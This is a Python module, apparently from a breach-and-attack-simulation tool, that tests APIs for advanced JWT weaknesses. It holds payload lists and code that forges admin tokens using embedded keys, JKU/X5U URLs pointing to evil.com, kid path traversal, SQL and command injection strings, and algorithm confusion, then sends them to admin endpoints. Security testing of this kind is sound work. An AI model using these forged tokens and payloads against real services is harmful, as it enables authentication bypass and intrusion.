"""
Advanced JWT attack testing module.

Extends beyond basic JWT attacks (alg:none, signature stripping) to test:
- JWK embedding (attacker embeds their own key in the JWT header)
- JKU/X5U header injection (pointing to attacker-controlled key servers)
- kid parameter path traversal and SQL injection
- Algorithm confusion with actual RSA->HMAC key reuse
- JWT header parameter pollution
- Cross-service token abuse

MITRE ATT&CK: T1550 - Use Alternate Authentication Material
"""

from __future__ import annotations

import base64
import json
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


def b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    """Base64url decode with padding restoration."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


# Pre-built attack payloads
# Format: ATTACK_TYPE:jwt_token_or_description
# For attacks that need a base token, the module generates them dynamically

JWT_ADVANCED_PAYLOADS = [
    # --- JWK Injection (CVE-2018-0114 style) ---
    # Embed an attacker-controlled public key directly in the JWT header
    "JWK_INJECT:embedded_rsa_jwk",
    "JWK_INJECT:embedded_ec_jwk",
    "JWK_INJECT:embedded_oct_jwk",

    # --- JKU Header Injection ---
    # Point the jku (JWK Set URL) to an attacker-controlled server
    "JKU_INJECT:http://evil.com/.well-known/jwks.json",
    "JKU_INJECT:http://localhost/.well-known/jwks.json",
    "JKU_INJECT:http://127.0.0.1/.well-known/jwks.json",
    "JKU_INJECT:https://evil.com/jwks.json#@trusted.com",
    "JKU_INJECT:https://trusted.com@evil.com/.well-known/jwks.json",
    "JKU_INJECT:https://trusted.com.evil.com/.well-known/jwks.json",

    # --- X5U Header Injection ---
    # Point the x5u (X.509 URL) to an attacker-controlled certificate
    "X5U_INJECT:http://evil.com/cert.pem",
    "X5U_INJECT:http://localhost/cert.pem",
    "X5U_INJECT:https://evil.com/cert.pem#@trusted.com",
    "X5U_INJECT:https://trusted.com@evil.com/cert.pem",

    # --- kid (Key ID) Path Traversal ---
    # The kid parameter is used to look up the signing key; if it's used
    # in a file path or command, traversal/injection is possible
    "KID_TRAVERSAL:../../../dev/null",
    "KID_TRAVERSAL:../../../../../../dev/null",
    "KID_TRAVERSAL:../../../etc/hostname",
    "KID_TRAVERSAL:/dev/null",
    "KID_TRAVERSAL:....//....//....//dev/null",
    "KID_TRAVERSAL:..\\..\\..\\windows\\win.ini",
    "KID_TRAVERSAL:/proc/sys/kernel/hostname",

    # --- kid SQL Injection ---
    # kid value used in database query without sanitization
    "KID_SQLI:' UNION SELECT 'AAA' -- ",
    "KID_SQLI:' UNION SELECT '' -- ",
    "KID_SQLI:' OR '1'='1' -- ",
    "KID_SQLI:' UNION ALL SELECT 'key123' FROM dual-- ",
    "KID_SQLI:non_existing_key' UNION SELECT 'ATTACKER_CONTROLLED_KEY'--",

    # --- kid Command Injection ---
    "KID_CMDI:|/usr/bin/env echo BAS_JWT_RCE",
    "KID_CMDI:;echo BAS_JWT_RCE;",
    "KID_CMDI:`echo BAS_JWT_RCE`",

    # --- Algorithm Confusion (RS256 -> HS256) ---
    # Sign with the server's RSA public key as HMAC secret
    "ALG_CONFUSION:rs256_to_hs256",
    "ALG_CONFUSION:rs384_to_hs384",
    "ALG_CONFUSION:rs512_to_hs512",
    "ALG_CONFUSION:es256_to_hs256",
    "ALG_CONFUSION:ps256_to_hs256",

    # --- Header Parameter Pollution ---
    "HEADER_POLLUTION:duplicate_kid",
    "HEADER_POLLUTION:duplicate_alg",
    "HEADER_POLLUTION:extra_crit_header",
    "HEADER_POLLUTION:typ_manipulation",

    # --- Cross-Service Token Abuse ---
    "CROSS_SERVICE:issuer_spoofing",
    "CROSS_SERVICE:audience_manipulation",
    "CROSS_SERVICE:subject_escalation",
]


class JWTAdvancedModule(BaseAttackModule):
    """
    Advanced JWT attack testing beyond basic algorithm confusion.

    Tests for sophisticated JWT vulnerabilities:
    - JWK injection: embedding attacker key in the token header
    - JKU/X5U injection: redirecting key verification to attacker server
    - kid parameter injection: path traversal, SQLi, command injection
    - Algorithm confusion: RSA public key as HMAC secret
    - Header parameter pollution: conflicting/duplicate parameters
    - Cross-service token abuse: issuer/audience manipulation
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="jwt_advanced",
            description="Advanced JWT attacks - JWK injection, JKU/X5U abuse, kid traversal, algorithm confusion",
            category="jwt_advanced",
            mitre_technique_ids=["T1550", "T1078"],
            mitre_technique_names=["Use Alternate Authentication Material", "Valid Accounts"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A07:2021 - Identification and Authentication Failures",
            cwe_ids=["CWE-347", "CWE-327", "CWE-22", "CWE-89"],
            tags=["jwt", "jws", "jwe", "auth", "token", "jwk", "jku", "kid"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = list(JWT_ADVANCED_PAYLOADS)

        # Generate dynamic payloads based on a provided token
        original_token = options.get("token", "")
        if original_token:
            payloads.extend(self._generate_advanced_attacks(original_token, options))

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("jwt_advanced", limit=50)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _generate_advanced_attacks(self, token: str, options: dict[str, Any]) -> list[str]:
        """Generate attack tokens from an original JWT."""
        attacks = []
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return attacks
            header = json.loads(b64url_decode(parts[0]))
            payload_data = json.loads(b64url_decode(parts[1]))
        except Exception:
            return attacks

        # JWK injection - embed a fake RSA public key in the header
        fake_jwk = {
            "kty": "RSA",
            "n": b64url_encode(b"\x00" * 256),
            "e": b64url_encode(b"\x01\x00\x01"),
            "kid": "bas-injected-key",
        }
        jwk_header = {**header, "alg": "RS256", "jwk": fake_jwk}
        jwk_token = (
            b64url_encode(json.dumps(jwk_header).encode())
            + "." + b64url_encode(json.dumps(payload_data).encode())
            + "." + parts[2]
        )
        attacks.append(f"JWK_INJECT_DYNAMIC:{jwk_token}")

        # JKU injection variants
        callback = options.get("callback_domain", "evil.com")
        for jku_url in [
            f"http://{callback}/.well-known/jwks.json",
            f"https://{callback}/jwks.json",
        ]:
            jku_header = {**header, "jku": jku_url}
            jku_token = (
                b64url_encode(json.dumps(jku_header).encode())
                + "." + b64url_encode(json.dumps(payload_data).encode())
                + "." + parts[2]
            )
            attacks.append(f"JKU_INJECT_DYNAMIC:{jku_token}")

        # X5U injection variants
        for x5u_url in [
            f"http://{callback}/cert.pem",
            f"https://{callback}/x5c.pem",
        ]:
            x5u_header = {**header, "x5u": x5u_url}
            x5u_token = (
                b64url_encode(json.dumps(x5u_header).encode())
                + "." + b64url_encode(json.dumps(payload_data).encode())
                + "." + parts[2]
            )
            attacks.append(f"X5U_INJECT_DYNAMIC:{x5u_token}")

        # kid traversal with original token structure
        traversal_kids = [
            "../../../dev/null",
            "/dev/null",
            "../../../../../../etc/hostname",
            "' UNION SELECT '' -- ",
        ]
        for kid_val in traversal_kids:
            kid_header = {**header, "kid": kid_val}
            kid_token = (
                b64url_encode(json.dumps(kid_header).encode())
                + "." + b64url_encode(json.dumps(payload_data).encode())
                + "."  # Empty signature (for /dev/null key = empty)
            )
            attacks.append(f"KID_DYNAMIC:{kid_token}")

        # Cross-service abuse: manipulate iss, aud, sub claims
        if "iss" in payload_data:
            for fake_iss in ["https://accounts.google.com", "https://login.microsoftonline.com", "http://localhost"]:
                cross_payload = {**payload_data, "iss": fake_iss}
                cross_token = (
                    parts[0]
                    + "." + b64url_encode(json.dumps(cross_payload).encode())
                    + "." + parts[2]
                )
                attacks.append(f"CROSS_SERVICE_ISS:{cross_token}")

        if "aud" in payload_data:
            cross_payload = {**payload_data, "aud": "*"}
            cross_token = (
                parts[0]
                + "." + b64url_encode(json.dumps(cross_payload).encode())
                + "." + parts[2]
            )
            attacks.append(f"CROSS_SERVICE_AUD:{cross_token}")

        # Header parameter pollution: duplicate alg
        polluted_header_json = json.dumps(header)[:-1] + ',"alg":"none"}'
        polluted_token = (
            b64url_encode(polluted_header_json.encode())
            + "." + b64url_encode(json.dumps(payload_data).encode())
            + "."
        )
        attacks.append(f"HEADER_POLLUTION_DYNAMIC:{polluted_token}")

        return attacks

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        auth_header = options.get("auth_header", "Authorization")
        auth_prefix = options.get("auth_prefix", "Bearer ")
        check_paths = options.get("check_paths", [
            options.get("path", "/api/admin"),
            "/api/me",
            "/api/users",
        ])

        for payload in payloads:
            attack_type, token_or_desc = payload.split(":", 1) if ":" in payload else ("UNKNOWN", payload)

            # For payloads that are descriptions (not actual tokens), generate a generic token
            if not self._looks_like_jwt(token_or_desc):
                token = self._generate_attack_token(attack_type, token_or_desc, options)
            else:
                token = token_or_desc

            for path in check_paths:
                req_id = uuid.uuid4().hex[:8]
                headers = {
                    auth_header: f"{auth_prefix}{token}",
                    "X-BAS-Attack-Type": attack_type,
                    "X-BAS-Payload": payload[:200],
                }

                # Add specific headers for certain attack types
                if attack_type == "JKU_INJECT" and self._looks_like_url(token_or_desc):
                    headers["X-BAS-JKU-URL"] = token_or_desc
                elif attack_type == "X5U_INJECT" and self._looks_like_url(token_or_desc):
                    headers["X-BAS-X5U-URL"] = token_or_desc

                requests.append(AttackRequest(
                    request_id=f"jwt-adv-{req_id}",
                    target=target,
                    method="GET",
                    path=path,
                    headers=headers,
                ))

        return requests

    def _generate_attack_token(self, attack_type: str, desc: str, options: dict[str, Any]) -> str:
        """Generate a synthetic JWT for attacks that need one."""
        base_header = {"alg": "RS256", "typ": "JWT"}
        base_payload = {
            "sub": "admin",
            "role": "admin",
            "admin": True,
            "iat": 1700000000,
            "exp": 2000000000,
        }

        if attack_type == "JWK_INJECT":
            fake_jwk = {
                "kty": "RSA",
                "n": b64url_encode(b"\x00" * 256),
                "e": b64url_encode(b"\x01\x00\x01"),
                "kid": "bas-injected",
            }
            if "ec" in desc:
                fake_jwk = {"kty": "EC", "crv": "P-256", "x": b64url_encode(b"\x00" * 32), "y": b64url_encode(b"\x00" * 32)}
            elif "oct" in desc:
                fake_jwk = {"kty": "oct", "k": b64url_encode(b"BAS_SECRET_KEY_FOR_TESTING")}
            base_header["jwk"] = fake_jwk

        elif attack_type == "JKU_INJECT":
            base_header["jku"] = desc  # desc is the URL

        elif attack_type == "X5U_INJECT":
            base_header["x5u"] = desc

        elif attack_type == "KID_TRAVERSAL":
            base_header["kid"] = desc
            # For /dev/null traversal, use empty HMAC signature
            base_header["alg"] = "HS256"

        elif attack_type == "KID_SQLI":
            base_header["kid"] = desc
            base_header["alg"] = "HS256"

        elif attack_type == "KID_CMDI":
            base_header["kid"] = desc

        elif attack_type == "ALG_CONFUSION":
            if "hs256" in desc:
                base_header["alg"] = "HS256"
            elif "hs384" in desc:
                base_header["alg"] = "HS384"
            elif "hs512" in desc:
                base_header["alg"] = "HS512"

        elif attack_type == "HEADER_POLLUTION":
            if "kid" in desc:
                base_header["kid"] = "legit-key"
            elif "crit" in desc:
                base_header["crit"] = ["bas_test"]
                base_header["bas_test"] = True
            elif "typ" in desc:
                base_header["typ"] = "at+jwt"

        elif attack_type == "CROSS_SERVICE":
            if "issuer" in desc:
                base_payload["iss"] = "https://accounts.google.com"
            elif "audience" in desc:
                base_payload["aud"] = "*"
            elif "subject" in desc:
                base_payload["sub"] = "admin@internal"

        token = (
            b64url_encode(json.dumps(base_header).encode())
            + "."
            + b64url_encode(json.dumps(base_payload).encode())
            + "."
            + b64url_encode(b"fake_signature_for_testing")
        )
        return token

    @staticmethod
    def _looks_like_jwt(s: str) -> bool:
        """Check if a string looks like a JWT (3 base64url-separated parts)."""
        parts = s.split(".")
        if len(parts) < 2:
            return False
        try:
            b64url_decode(parts[0])
            b64url_decode(parts[1])
            return True
        except Exception:
            return False

    @staticmethod
    def _looks_like_url(s: str) -> bool:
        return s.startswith("http://") or s.startswith("https://")

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")
        payload_used = request.headers.get("X-BAS-Payload", payload)

        severity_map = {
            "JWK_INJECT": "critical",
            "JWK_INJECT_DYNAMIC": "critical",
            "JKU_INJECT": "critical",
            "JKU_INJECT_DYNAMIC": "critical",
            "X5U_INJECT": "critical",
            "X5U_INJECT_DYNAMIC": "critical",
            "KID_TRAVERSAL": "critical",
            "KID_DYNAMIC": "critical",
            "KID_SQLI": "critical",
            "KID_CMDI": "critical",
            "ALG_CONFUSION": "critical",
            "HEADER_POLLUTION": "high",
            "HEADER_POLLUTION_DYNAMIC": "high",
            "CROSS_SERVICE": "high",
            "CROSS_SERVICE_ISS": "high",
            "CROSS_SERVICE_AUD": "high",
        }

        # Authentication accepted with manipulated token = vulnerability
        if response.status_code in (200, 201, 204):
            # Check that this is actually an authenticated response, not a public page
            auth_indicators = [
                "admin", "user", "profile", "dashboard", "account",
                "email", "role", "token", "session", "authenticated",
                "welcome", "settings", "preferences",
            ]
            body_lower = body.lower()
            looks_authenticated = any(ind in body_lower for ind in auth_indicators)

            # Explicitly check for unauthenticated / error responses masquerading as 200
            rejection_indicators = [
                "unauthorized", "unauthenticated", "invalid token",
                "expired", "invalid signature", "login required",
                "access denied", "forbidden",
            ]
            was_rejected = any(ind in body_lower for ind in rejection_indicators)

            if looks_authenticated and not was_rejected:
                return ModuleResult(
                    module_name="jwt_advanced",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"JWT {attack_type} attack accepted: server returned authenticated response ({response.status_code})",
                    severity=severity_map.get(attack_type, "high"),
                    mitre_technique_id="T1550",
                    detail={"detection_type": f"jwt_{attack_type.lower()}", "attack_type": attack_type},
                )

            if not was_rejected:
                return ModuleResult(
                    module_name="jwt_advanced",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"JWT {attack_type}: server returned {response.status_code} without explicit rejection",
                    severity=severity_map.get(attack_type, "medium"),
                    mitre_technique_id="T1550",
                    detail={"detection_type": f"jwt_{attack_type.lower()}_potential", "attack_type": attack_type},
                )

        # Check for SQL error messages (kid SQLi)
        if attack_type == "KID_SQLI":
            sql_errors = [
                "sql", "syntax error", "mysql", "postgresql",
                "sqlite", "oracle", "mssql", "database error",
                "query", "column", "table",
            ]
            body_lower = body.lower()
            for err in sql_errors:
                if err in body_lower:
                    return ModuleResult(
                        module_name="jwt_advanced",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"JWT kid SQL injection: database error '{err}' in response",
                        severity="critical",
                        mitre_technique_id="T1550",
                        detail={"detection_type": "kid_sqli", "error_indicator": err},
                    )

        # Check for command injection output
        if attack_type == "KID_CMDI" and "BAS_JWT_RCE" in body:
            return ModuleResult(
                module_name="jwt_advanced",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="JWT kid command injection: RCE confirmed - 'BAS_JWT_RCE' in response",
                severity="critical",
                mitre_technique_id="T1550",
                detail={"detection_type": "kid_cmdi"},
            )

        # Check for path traversal indicators
        if attack_type in ("KID_TRAVERSAL", "KID_DYNAMIC"):
            traversal_indicators = [
                ("root:x:0", "System file disclosure via kid path traversal"),
                ("[boot loader]", "Windows file disclosure via kid path traversal"),
                ("hostname", "Hostname leaked via kid path traversal"),
            ]
            for indicator, desc in traversal_indicators:
                if indicator in body:
                    return ModuleResult(
                        module_name="jwt_advanced",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"JWT kid traversal: {desc}",
                        severity="critical",
                        mitre_technique_id="T1550",
                        detail={"detection_type": "kid_traversal"},
                    )

        # JKU/X5U callback detection - check if the server made an outbound request
        if attack_type in ("JKU_INJECT", "JKU_INJECT_DYNAMIC", "X5U_INJECT", "X5U_INJECT_DYNAMIC"):
            # If we got a different error than "invalid signature" it may mean
            # the server tried to fetch the key
            body_lower = body.lower()
            fetch_indicators = [
                "connection refused", "timeout", "could not resolve",
                "dns", "unreachable", "certificate",
            ]
            for ind in fetch_indicators:
                if ind in body_lower:
                    return ModuleResult(
                        module_name="jwt_advanced",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"JWT {attack_type}: server attempted outbound key fetch ('{ind}' in error)",
                        severity="high",
                        mitre_technique_id="T1550",
                        detail={"detection_type": f"{attack_type.lower()}_ssrf", "indicator": ind},
                    )

        return ModuleResult(
            module_name="jwt_advanced",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
